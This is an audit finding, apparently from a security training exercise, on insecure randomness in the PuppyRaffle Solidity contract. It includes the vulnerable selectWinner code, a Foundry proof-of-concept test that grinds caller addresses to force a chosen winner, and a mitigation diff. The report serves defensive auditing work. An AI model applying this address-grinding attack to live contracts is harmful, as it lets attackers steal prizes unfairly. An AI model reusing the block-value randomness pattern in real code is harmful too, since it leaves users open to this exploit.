Title: Weak randomness lets callers and block producers bias winner selection
Impact: High
Likelihood: Medium
Scope: `src/PuppyRaffle.sol`

# Root + Impact

## Description

The raffle should fairly select a random winner after the raffle duration has passed.

`selectWinner` derives the winner from `msg.sender`, `block.timestamp`, and `block.difficulty`. These are predictable or influenceable values. The caller fully controls `msg.sender`, and a block producer can influence block-level values. This lets an attacker bias the winner selection for the core raffle prize.

```solidity
function selectWinner() external {
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    require(players.length >= 4, "PuppyRaffle: Need at least 4 players");

    // @> Not secure randomness: caller-controlled and block-controlled values.
    uint256 winnerIndex =
        uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
    address winner = players[winnerIndex];
    ...
}
```

## Risk

**Likelihood**:

* The `selectWinner` function is permissionless, so any address can trigger winner selection.

* A motivated attacker can simulate outcomes off-chain for different caller addresses, and block producers have additional influence over block fields.

**Impact**:

* The raffle winner can be biased toward the attacker or a chosen participant.

* The core fairness property of the raffle is broken, and the attacker can win the ETH prize and puppy NFT unfairly.

## Proof of Concept

This test demonstrates that the caller can choose an address that causes a desired player to win under fixed block conditions.

```solidity
function testCallerCanBiasWinnerByChoosingMsgSender() public {
    address targetWinner = address(4);

    address[] memory players = new address[](4);
    players[0] = address(1);
    players[1] = address(2);
    players[2] = address(3);
    players[3] = targetWinner;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);

    address biasedCaller;
    for (uint160 i = 100; i < 1000; i++) {
        address candidate = address(i);
        uint256 winnerIndex = uint256(
            keccak256(abi.encodePacked(candidate, block.timestamp, block.difficulty))
        ) % players.length;
        if (players[winnerIndex] == targetWinner) {
            biasedCaller = candidate;
            break;
        }
    }

    vm.prank(biasedCaller);
    puppyRaffle.selectWinner();

    assertEq(puppyRaffle.previousWinner(), targetWinner);
}
```

The caller does not need permission to call `selectWinner`, so choosing a favorable caller address is enough to bias the result in this scenario.

## Recommended Mitigation

Use a verifiable randomness source such as Chainlink VRF or a commit-reveal scheme. Avoid using block values and `msg.sender` as randomness.

```diff
- uint256 winnerIndex =
-     uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
+ // Request randomness from a verifiable randomness provider.
+ // Finalize winner selection only after the randomness callback is fulfilled.
+ uint256 winnerIndex = randomWord % players.length;
```
